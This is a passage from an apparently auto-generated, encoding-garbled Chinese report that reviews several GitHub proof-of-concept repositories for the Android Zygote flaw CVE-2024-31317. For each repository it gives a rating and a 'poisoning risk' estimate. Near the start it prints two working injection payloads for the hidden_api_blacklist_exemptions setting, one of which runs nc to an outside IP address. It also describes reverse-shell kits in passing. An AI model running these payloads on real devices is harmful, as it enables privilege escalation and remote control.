1.  **è·å– `WRITE_SECURE_SETTINGS` æƒé™ï¼š** è¿™æ˜¯åˆ©ç”¨è¯¥æ¼æ´çš„å‰ææ¡ä»¶ã€‚å¯ä»¥é€šè¿‡ ADB (å¦‚æœè®¾å¤‡å·²å¯ç”¨ USB è°ƒè¯•) æˆ–åˆ©ç”¨å…¶ä»–æ¼æ´æ¥è·å–æ­¤æƒé™ã€‚
2.  **æ„é€ æ¶æ„ `hidden_api_blacklist_exemptions` å€¼ï¼š** æ”»å‡»è€…éœ€è¦æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ `settings put global hidden_api_blacklist_exemptions` å‘½ä»¤å°†å…¶å†™å…¥ç³»ç»Ÿè®¾ç½®ã€‚
3.  **è§¦å‘ Zygote è¿›ç¨‹ï¼š**  å†™å…¥è®¾ç½®åï¼Œå½“ç³»ç»Ÿå°è¯•ä½¿ç”¨è¢«ç¯¡æ”¹çš„ `hidden_api_blacklist_exemptions` æ—¶ï¼ŒZygote è¿›ç¨‹ä¼šæ‰§è¡Œæ³¨å…¥çš„æ¶æ„å‘½ä»¤ã€‚

**ä½ç‰ˆæœ¬ (Android 11 åŠä»¥ä¸‹) åˆ©ç”¨ï¼š**
å¯ä»¥ç›´æ¥é€šè¿‡æ¢è¡Œç¬¦è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n8\n--runtime-args\n--setuid=1000\n--setgid=1000\n--nice-name=com.android.settings\n--app-data-dir=/data/user/0/com.android.settings\n--package-name=com.android.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\nandroid.app.ActivityThread"
```
å¯ä»¥ä½¿ç”¨`invoke-with`å‚æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä½†éœ€è¦å¼€å¯ debug æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡`runtime-flags`å‚æ•°è®¾ç½®æ‰€æœ‰debugå±æ€§ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n7\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=43267\n--invoke-with\nnc 192.168.0.112 9981;\n--seinfo=platform:system_app:targetSdkVersion=29:complete"
```

**é«˜ç‰ˆæœ¬ (Android 12 åŠä»¥ä¸Š) åˆ©ç”¨ï¼š**
ç”±äº Google åœ¨ Android 12 ä¸­å¼•å…¥äº† C++ å‘½ä»¤è§£æå™¨ï¼Œç®€å•çš„å‘½ä»¤æ³¨å…¥ä¸å†æœ‰æ•ˆã€‚éœ€è¦ä½¿ç”¨æ›´å¤æ‚çš„ç»•è¿‡æ–¹æ³•ï¼Œä¾‹å¦‚ï¼Œåœ¨æ³¨å…¥çš„æ¶æ„å‘½ä»¤ä¹‹å‰å¡«å……å¤§é‡é€—å·ä»¥å¢åŠ æ—¶é—´é—´éš”ï¼Œä»è€Œç»•è¿‡ `NativeCommandBuffer` çš„é™åˆ¶ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’Œåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ PoC ä»£ç åº”è¯¥æ˜¯æœ‰æ•ˆçš„ã€‚å¤šä¸ªæœç´¢å¼•æ“ç»“æœéƒ½æåˆ°äº†è¯¥æ¼æ´çš„åˆ©ç”¨ï¼Œå¹¶æä¾›äº†ç›¸å…³çš„åˆ†æå’Œå‚è€ƒé“¾æ¥ã€‚æä¾›çš„åˆ©ç”¨ä»£ç ä¹ŸåŒ…å«äº†ä½ç‰ˆæœ¬å’Œé«˜ç‰ˆæœ¬çš„åˆ©ç”¨æ–¹æ³•ï¼Œå¹¶ç»™å‡ºäº†è¯¦ç»†çš„æ­¥éª¤å’Œç¤ºä¾‹ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è¯¥ä»“åº“ä¸»è¦åŒ…å«æ¼æ´åˆ©ç”¨çš„è¯´æ˜æ–‡æ¡£å’Œä¸€äº›æ„å»ºæ–‡ä»¶ã€‚è™½ç„¶æ— æ³•å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½æ€§ï¼Œä½†ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œé£é™©è¾ƒä½ã€‚é£é™©ç‚¹å¯èƒ½å­˜åœ¨äºåˆ©ç”¨è„šæœ¬ä¸­ï¼Œä¾‹å¦‚æ‰§è¡Œ nc å‘½ä»¤ï¼Œè™½ç„¶æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç»œå·¥å…·ï¼Œä½†æ˜¯å­˜åœ¨è¢«åˆ©ç”¨çš„é£é™©ï¼Œä¾‹å¦‚è¿æ¥åˆ°æ¶æ„çš„æœåŠ¡å™¨ã€‚gradleæ–‡ä»¶é£é™©è¾ƒå°ï¼Œä¸»è¦æ˜¯æ„å»ºé…ç½®ï¼Œä½†ç†è®ºä¸Šå­˜åœ¨è¿œç¨‹ä¾èµ–å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [fuhei/CVE-2024-31317](https://github.com/fuhei/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #6

**æ¥æº**: [CVE-2024-31317-jmywh1_CVE-2024-31317.md](../2024/CVE-2024-31317-jmywh1_CVE-2024-31317.md)

## CVE-2024-31317-Android-Zygoteååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`android.permission.WRITE_SECURE_SETTINGS`æƒé™ï¼Œç”¨æˆ·äº¤äº’ä¸æ˜¯å¿…é¡»çš„

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317æ˜¯ä¸€ä¸ªAndroidç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äºZygoteProcess.javaçš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰`WRITE_SECURE_SETTINGS`æƒé™çš„åº”ç”¨ç¨‹åºï¼Œä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ï¼Œå¯¼è‡´æœ¬åœ°ææƒã€‚æ ¹æ®NVDçš„æè¿°ï¼Œè¯¥æ¼æ´çš„CVSS 3.1è¯„åˆ†ä¸º7.8ï¼Œå±äºé«˜å±æ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…åˆ©ç”¨`WRITE_SECURE_SETTINGS`æƒé™ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œä¼ é€’ç»™Zygoteè¿›ç¨‹å¤„ç†ã€‚Zygoteè¿›ç¨‹åœ¨ååºåˆ—åŒ–è¿™äº›æ•°æ®æ—¶ï¼Œç”±äºç¼ºä¹è¶³å¤Ÿçš„å®‰å…¨æ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæå‡æƒé™åˆ°å…¶ä»–åº”ç”¨ã€‚

**POCä»£ç åˆ†æï¼š**
æä¾›çš„POCä»£ç åŒ…å«`build.gradle`ã€`gradle.properties`å’Œ`gradlew`æ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„Android Gradleé¡¹ç›®çš„åŸºæœ¬æ–‡ä»¶ã€‚å®ƒä»¬ä¸»è¦ç”¨äºæ„å»ºAndroidåº”ç”¨ç¨‹åºï¼Œæœ¬èº«ä¸åŒ…å«ç›´æ¥åˆ©ç”¨CVE-2024-31317æ¼æ´çš„ä»£ç ã€‚è¿™ä¸ªåº“æœ¬èº«åªæ˜¯å®‰å“é¡¹ç›®gradleæ„å»ºæ–‡ä»¶ï¼Œè¦åˆ©ç”¨æ¼æ´è¿˜éœ€è¦æ›´å¤šä¿¡æ¯ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è™½ç„¶æä¾›çš„ä»£ç ç‰‡æ®µæœ¬èº«ä¸ç›´æ¥æ„æˆæ¼æ´åˆ©ç”¨ï¼Œä½†ä½œä¸ºä¸€ä¸ªAndroidé¡¹ç›®ï¼Œå®ƒå¯ä»¥è¢«ç”¨æ¥æ„å»ºåŒ…å«æ¼æ´åˆ©ç”¨ä»£ç çš„æ¶æ„åº”ç”¨ã€‚`gradlew`è„šæœ¬å¯èƒ½è¢«ä¿®æ”¹ä¸ºåŒ…å«ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„ä»£ç çš„æ­¥éª¤ï¼Œæˆ–è€…`build.gradle`æ–‡ä»¶å¯èƒ½è¢«ä¿®æ”¹ä¸ºå¼•å…¥åŒ…å«æ¶æ„ä»£ç çš„ä¾èµ–é¡¹ã€‚è€ƒè™‘åˆ°è¿™ç§å¯èƒ½æ€§ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º10%ã€‚è¿™ä¸ªæ¦‚ç‡ä¸»è¦æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨æ„å»ºè¿‡ç¨‹ä¸­æ·»åŠ æ¶æ„ä¾èµ–æˆ–è€…æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œä½†æ˜¯ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œå¹¶æ²¡æœ‰ç›´æ¥çš„è¯æ®è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [jmywh1/CVE-2024-31317](https://github.com/jmywh1/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #7

**æ¥æº**: [CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317 Android ZygoteProcess ååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´å¯¼è‡´ææƒ

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°ææƒåˆ°ä»»æ„åº”ç”¨æƒé™

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦Useræ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’ï¼Œéœ€è¦WRITE_SECURE_SETTINGSæƒé™ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 70%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android æ“ä½œç³»ç»Ÿä¸­çš„æƒé™æå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™æ‰§è¡Œä»»æ„åº”ç”¨ç¨‹åºçš„ä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´æœ¬åœ°æƒé™æå‡ã€‚ä»æœç´¢å¼•æ“ç»“æœæ¥çœ‹ï¼Œè¿™ä¸ªæ¼æ´è¢«è®¤ä¸ºæ˜¯è¿‘å¹´æ¥æœ€æœ‰ä»·å€¼çš„Androidç”¨æˆ·ç©ºé—´æ¼æ´ä¹‹ä¸€ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„åˆ©ç”¨æ–¹æ³•ã€‚æ¼æ´åˆ©ç”¨ä»£ç  `Android_Zygote_Research_Kit.sh` è„šæœ¬æ—¨åœ¨å¸®åŠ©ç ”ç©¶äººå‘˜å¤ç°å’Œåˆ†ææ­¤æ¼æ´ã€‚å®ƒåŒ…å«ä¸€ä¸ªåå‘ shell ç¨‹åºï¼ˆ`reverse_shell.c`ï¼‰ï¼Œä¸€ä¸ª payload æ–‡ä»¶ï¼ˆ`payload.txt`ï¼‰ï¼Œä¸€ä¸ªç¼–è¯‘è„šæœ¬ï¼ˆ`compile.sh`ï¼‰ï¼Œä»¥åŠç›¸å…³çš„è¯´æ˜æ–‡æ¡£ã€‚è„šæœ¬å°è¯•åˆ›å»ºä¸€ä¸ªç›‘å¬ç‰¹å®šç«¯å£çš„åå‘ shellï¼Œè¿™æœ¬èº«å°±å­˜åœ¨ä¸€å®šçš„é£é™©ã€‚è„šæœ¬ä¸­åå‘è¿æ¥çš„ç¡¬ç¼–ç ç«¯å£å’ŒIPåœ°å€ï¼Œæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å®³è®¾å¤‡çš„åå‘è¿æ¥ã€‚è€ƒè™‘åˆ°è„šæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ç ”ç©¶äººå‘˜ä½¿ç”¨ï¼Œå­˜åœ¨ä¸€ç§æŠ•æ¯’é£é™©ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹åå‘ shell çš„ä»£ç ï¼Œåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ¤å…¥æ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä¿®æ”¹ `reverse_shell.c` ä½¿å…¶åœ¨å»ºç«‹è¿æ¥åæ‰§è¡ŒæŸäº›æ¶æ„æ“ä½œï¼Œæˆ–è€…å°†æ”¶é›†åˆ°çš„ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚ç”±äºè¿™ä¸ªæ¼æ´å…è®¸æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ï¼Œå¦‚æœè¢«æ¶æ„åˆ©ç”¨ï¼Œå¯ä»¥é€ æˆå¾ˆå¤§çš„å±å®³ã€‚

åˆ©ç”¨æ–¹å¼ï¼š

1.  **æƒé™è·å–:** æ”»å‡»è€…éœ€è¦å…ˆè·å¾— `WRITE_SECURE_SETTINGS` æƒé™ã€‚
2.  **æ„é€ æ¶æ„æ•°æ®:**  æ„é€ åŒ…å«æ¶æ„ä»£ç çš„ååºåˆ—åŒ–æ•°æ®ã€‚
3.  **åˆ©ç”¨ ZygoteProcess:**  å°†æ¶æ„æ•°æ®ä¼ é€’ç»™å­˜åœ¨æ¼æ´çš„ `ZygoteProcess.java` å‡½æ•°ã€‚
4.  **ä»£ç æ‰§è¡Œ:**  åˆ©ç”¨ Zygote è¿›ç¨‹çš„æƒé™æ‰§è¡Œä»»æ„ä»£ç ï¼Œå®ç°æƒé™æå‡ã€‚

è¯¥`Android_Zygote_Research_Kit.sh`è„šæœ¬åªæ˜¯ä¸€ä¸ªè¾…åŠ©åˆ©ç”¨å·¥å…·ï¼Œç”¨äºç”Ÿæˆæ‰€éœ€çš„æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [mianliupindao/CVE-2024-31317-PoC-Deployer](https://github.com/mianliupindao/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---



---

## POC #2

**æ¥æº**: [CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-JadeByteZen_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** æƒé™æå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œå’Œæƒé™æå‡

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰§è¡Œæƒé™(User execution privileges needed)ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 æ¼æ´å­˜åœ¨äºAndroidç³»ç»Ÿçš„Zygoteè¿›ç¨‹ä¸­ï¼Œç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–å¯¼è‡´å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™å®ç°ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å½±å“Android 12ã€12Lã€13å’Œ14ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´æå‡æƒé™ï¼Œåœ¨å—å½±å“çš„è®¾å¤‡ä¸Šä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼š**  `ZygoteProcess.java`ä¸­çš„å¤šä¸ªå‡½æ•°å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **æƒé™æå‡ï¼š** æ”»å‡»è€…éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™ï¼Œè¿™ä¸ªæƒé™é€šå¸¸éœ€è¦é€šè¿‡å…¶ä»–æ¼æ´æˆ–è€…é€šè¿‡æ¬ºéª—ç”¨æˆ·æˆäºˆã€‚å¦‚æœæ”»å‡»è€…æ‹¥æœ‰äº†è¿™ä¸ªæƒé™,ä»–ä»¬å°±å¯ä»¥é€šè¿‡Zygoteè¿›ç¨‹æ‰§è¡Œä»£ç ï¼Œæ¨¡æ‹Ÿä»»ä½•appçš„èº«ä»½ã€‚
3.  **ä»£ç æ‰§è¡Œï¼š**  é€šè¿‡åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡è®¾å¤‡ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**POCæœ‰æ•ˆæ€§åˆ†æï¼š**

æä¾›çš„`Android_Zygote_Research_Kit.sh`è„šæœ¬åŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼š

*   `reverse_shell.c`ï¼šä¸€ä¸ªåå‘shellç¨‹åºï¼Œç”¨äºåœ¨ç›®æ ‡è®¾å¤‡ä¸Šå»ºç«‹ä¸æ”»å‡»è€…çš„è¿æ¥ã€‚
*   `payload91011.txt` å’Œ `payload1213.txt`ï¼šé’ˆå¯¹ä¸åŒAndroidç‰ˆæœ¬çš„æ¼æ´åˆ©ç”¨payloadã€‚
*   `compile.sh`ï¼šç”¨äºç¼–è¯‘åå‘shellç¨‹åºçš„è„šæœ¬ã€‚
*   `README.txt` å’Œ `CVE-2024-31317.txt`ï¼šæä¾›æ¼æ´åˆ©ç”¨çš„è¯´æ˜å’ŒæŠ€æœ¯åˆ†æã€‚

è¯¥è„šæœ¬é€šè¿‡ç”Ÿæˆæ¶æ„payloadå¹¶ç»“åˆåå‘shellç¨‹åºï¼Œå®ç°äº†å¯¹CVE-2024-31317æ¼æ´çš„åˆ©ç”¨ã€‚å› æ­¤ï¼Œæä¾›çš„POCä»£ç è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨æ¥éªŒè¯å’Œåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶è„šæœ¬ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼æ´ç ”ç©¶å’Œåˆ©ç”¨ï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼š

*   **åå‘Shellçš„æ½œåœ¨é£é™©ï¼š** `reverse_shell.c`æœ¬èº«å¯ä»¥è¢«è§†ä¸ºä¸€ç§åé—¨ã€‚ä¸€æ—¦æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—è®¾å¤‡çš„æ§åˆ¶æƒï¼Œæ‰§è¡Œæ¶æ„æ“ä½œã€‚
*   **å…¶ä»–æ¶æ„ä»£ç æ¤å…¥é£é™©ï¼š** è„šæœ¬ä¸­å¯èƒ½åŒ…å«å…¶ä»–æœªå£°æ˜çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ä¿¡æ¯æ”¶é›†ã€æ¶æ„è½¯ä»¶ä¼ æ’­ç­‰ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å­˜åœ¨ï¼Œä½†ä¸»è¦é£é™©é›†ä¸­åœ¨åå‘shellçš„åŠŸèƒ½ä¸Šï¼Œä»¥åŠè„šæœ¬ä½œè€…å¯èƒ½æ¤å…¥çš„æ½œåœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ä½œè€…å£°æ˜çš„MITå¼€æºåè®®ä»¥åŠä»£ç ä¸­æ˜æ˜¾çš„åŠŸèƒ½å®ç°ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [JadeByteZen/CVE-2024-31317-PoC-Deployer](https://github.com/JadeByteZen/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #3

**æ¥æº**: [CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-Webldix_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317-Android Zygote Deserialization

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ç‰¹æƒæå‡

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`WRITE_SECURE_SETTINGS`æƒé™å’Œç”¨æˆ·æ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-31317æ˜¯Androidç³»ç»Ÿä¸­çš„ä¸€ä¸ªç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äº`ZygoteProcess.java`çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™åœ¨ä»»ä½•åº”ç”¨ä¸­æ‰§è¡Œä»£ç ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œåˆ©ç”¨æ­¤æ¼æ´æ— éœ€ç”¨æˆ·äº¤äº’ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´åœ¨Zygoteè¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œè¿›è€Œæ§åˆ¶æ–°åˆ›å»ºçš„åº”ç”¨è¿›ç¨‹ã€‚æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ›´åƒä¸€ä¸ªåå‘shellçš„ç”Ÿæˆè„šæœ¬ï¼Œæœ¬èº«ä¸ç›´æ¥åŒ…å«æ¼æ´åˆ©ç”¨ä»£ç ï¼Œä½†è„šæœ¬ç”Ÿæˆçš„åå‘shellå¯ä»¥é€šè¿‡æ¼æ´åˆ©ç”¨payloadæ‰§è¡Œï¼Œé—´æ¥å®Œæˆæ¼æ´åˆ©ç”¨è¿‡ç¨‹ã€‚ æŠ•æ¯’é£é™©è¯„ä¼°ä¸º5%ï¼Œä¸»è¦æ˜¯å› ä¸ºè„šæœ¬æœ¬èº«ä¼šä»å¤–éƒ¨å¯¼å…¥payloadï¼Œå­˜åœ¨payloadè¢«æ›¿æ¢çš„é£é™©ï¼Œä¸”è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æœç´¢ç»“æœå’Œæ¼æ´æè¿°ï¼Œæ¼æ´æ˜¯ç”±äº`ZygoteProcess.java`ä¸­å­˜åœ¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–é€ æˆçš„ï¼Œé€šè¿‡`WRITE_SECURE_SETTINGS`æƒé™ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ã€‚æä¾›çš„è„šæœ¬åˆ›å»ºäº†ä¸€ä¸ªåå‘shellï¼Œè¯¥åå‘shelléœ€è¦è¢«æ³¨å…¥åˆ°åˆ©ç”¨é“¾ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–`WRITE_SECURE_SETTINGS`æƒé™ï¼š** æ”»å‡»è€…éœ€è¦é¦–å…ˆè·å–`WRITE_SECURE_SETTINGS`æƒé™ã€‚è¿™å¯ä»¥é€šè¿‡å·²æœ‰çš„æ¼æ´ã€æƒé™æå‡æˆ–è€…æ¶æ„åº”ç”¨æ¥å®ç°ã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š**  åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€ æ¶æ„çš„payloadï¼Œè¯¥payloadä¼šæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œä¾‹å¦‚ï¼Œå¯åŠ¨ä¸€ä¸ªåå‘shellã€‚
3.  **åˆ©ç”¨Zygoteè¿›ç¨‹ï¼š**  é€šè¿‡æŸç§æ–¹å¼è§¦å‘Zygoteè¿›ç¨‹æ‰§è¡ŒåŒ…å«æ¶æ„payloadçš„ååºåˆ—åŒ–æ“ä½œã€‚
4.  **ä»£ç æ‰§è¡Œï¼š**  å½“Zygoteè¿›ç¨‹ååºåˆ—åŒ–æ¶æ„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…çš„ä»£ç å°†åœ¨ç›®æ ‡åº”ç”¨è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°æƒé™æå‡ã€‚
5.  **åå‘Shellè¿æ¥:** æ”»å‡»è€…é€šè¿‡é¢„è®¾çš„IPå’Œç«¯å£æ¥æ”¶åå‘shellï¼Œä»è€Œæ§åˆ¶è®¾å¤‡

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„è„šæœ¬ä¸»è¦ç”¨äºç”Ÿæˆåå‘shellç›¸å…³çš„ä»£ç ï¼Œæœ¬èº«çœ‹èµ·æ¥æ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚ä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **Payloadçš„æ½œåœ¨é£é™©ï¼š** è¯¥è„šæœ¬ä¾èµ–äºå¤–éƒ¨æä¾›çš„payloadã€‚å¦‚æœpayloadè¢«æ›¿æ¢ä¸ºæ¶æ„ä»£ç ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´ä¸¥é‡çš„åæœã€‚
*   **åå‘Shellé£é™©ï¼š** åå‘shellæœ¬èº«å…·æœ‰é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºéæ³•ç›®çš„ï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·æ•°æ®ã€è¿œç¨‹æ§åˆ¶è®¾å¤‡ç­‰ã€‚
*   **è„šæœ¬ä½œè€…çš„å…è´£å£°æ˜:** è„šæœ¬ä½œè€…å£°æ˜äº†å…è´£æ¡æ¬¾ï¼Œæš—ç¤ºå­˜åœ¨ä¸€å®šé£é™©ã€‚

